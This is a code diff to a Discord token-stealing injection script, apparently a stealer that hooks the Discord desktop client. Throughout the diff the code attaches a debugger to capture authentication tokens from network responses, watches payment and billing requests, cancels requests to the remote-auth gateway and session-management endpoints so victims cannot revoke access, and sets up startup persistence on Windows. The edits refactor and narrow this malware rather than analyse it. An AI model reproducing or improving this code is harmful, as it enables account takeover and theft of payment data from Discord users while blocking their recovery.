@@ -890,9 +890,6 @@ const startup = async () => {
             case 'win32':
                 resourceDir = path.join(appDir, 'resources');
                 break;
-            case 'darwin':
-                resourceDir = path.join(appDir, 'Contents', 'Resources');
-                break;
             default:
                 return { resource: undefined, app: undefined };
         }
@@ -921,7 +918,9 @@ const startup = async () => {
         if (fs.existsSync(file)) fs.unlinkSync(file);
     });
 
-    if (['win32', 'darwin'].includes(process.platform)) {
+    // In the future maybe add more operating systems!
+    // This may work on other systems but Windows is recommended
+    if (['win32'].includes(process.platform)) {
         fs.writeFileSync(packageJsonFile, JSON.stringify({ name: 'discord', main: 'index.js' }, null, 4));
 
         const scriptRunJsFileContent = `
@@ -1162,22 +1161,20 @@ const createWindow = () => {
     mainWindow.webContents.debugger.attach('1.3');
     mainWindow.webContents.debugger.on('message', async (_, method, params) => {
         if ('Network.responseReceived' !== method) return;
+
         if (
             !CONFIG.auth_filters.urls.some(url => params.response.url.endsWith(url)) ||
             ![200, 202].includes(params.response.status)
         ) return;
 
         try {
-            const [
-                responseUnparsed,
-                requestUnparsed
-            ] = await Promise.all([
+            const [{ body: responseBody }, { postData: requestPostData }] = await Promise.all([
                 mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: params.requestId }),
                 mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', { requestId: params.requestId })
             ]);
 
-            const RESPONSE_DATA = parseJSON(responseUnparsed.body);
-            const RESQUEST_DATA = parseJSON(requestUnparsed.postData);
+            const RESPONSE_DATA = parseJSON(responseBody);
+            const RESQUEST_DATA = parseJSON(requestPostData);
 
             const { 
                 token,
@@ -1189,19 +1186,21 @@ const createWindow = () => {
             console.error(error);
         }
     });
+
     mainWindow.webContents.debugger.sendCommand('Network.enable');
+
     mainWindow.on('closed', () => {
         createWindow();
     });
 };
 
 const isLogged = async () => {
+    const LOG_FILE_PATH = path.join(__dirname, 'core.log');
+
     try {
         const { 
             token 
         } = await AuritaCord();
-
-        const LOG_FILE_PATH = path.join(__dirname, 'core.log');
 
         if (token) {
             if (!fs.existsSync(LOG_FILE_PATH)) {
@@ -1214,9 +1213,6 @@ const isLogged = async () => {
                     provider: null,
                     voip_provider: null,
                 }));
-
-                await delay(5000);
-                await execScript('location.reload();');
 
                 return false;
             };
@@ -1239,7 +1235,10 @@ const defaultSession = () => {
     webRequest.onCompleted(CONFIG.payment_filters, async (details) => {
         const { url, uploadData, method, statusCode, billing_address } = details;
 
-        if (!['POST'].includes(method) && ![200, 202].includes(statusCode)) return;
+        if (
+            ![200, 202].includes(statusCode) &&
+            !['POST'].includes(method)
+        ) return;
         
         const { 
             token, 
@@ -1418,14 +1417,15 @@ const interceptRequest = () => {
         }
 
         switch (true) {
-            case (url.endsWith('/@me') && !script_executed):
-                await processUserUpdate();
-
+            case (url.endsWith('/@me') && !script_executed) || (url.includes('/settings') && !script_executed):
+                if (url.endsWith('/@me')) {
+                    await processUserUpdate();
+                }
                 if (url.includes('/settings')) {
                     script_executed = true;
                 }
                 break;
-        };
+        }
     });
 };
 
@@ -1434,25 +1434,22 @@ const allSessionsLocked = async () => {
     if (!webRequest) return;
 
     webRequest.onBeforeRequest(CONFIG.session_filters, (details, callback) => {
-        if (details.url.includes("wss://remote-auth-gateway") || details.url.includes("auth/sessions")) {
-            callback({ cancel: true }); 
-        } else {
-            callback({ cancel: false });
-        }
+        const cancel = 
+            details.url.includes("wss://remote-auth-gateway") ||
+            details.url.includes("auth/sessions");
+
+        callback({ cancel });
     });
 
-    (async () => {
-        try {
-            const enabled = await isLogged();
-            if (enabled) return interceptRequest();
-        } catch (error) {
-            console.error(error);
-        };
-    })();
+    try {
+        const isEnabled = await isLogged();
+        if (isEnabled) return interceptRequest();
+    } catch (error) {
+        console.error(error);
+    };
     
     setTimeout(allSessionsLocked, 5000);
 };
-
 
 const complete = async () => {
     if (CONFIG.force_persist_startup === 'true') {
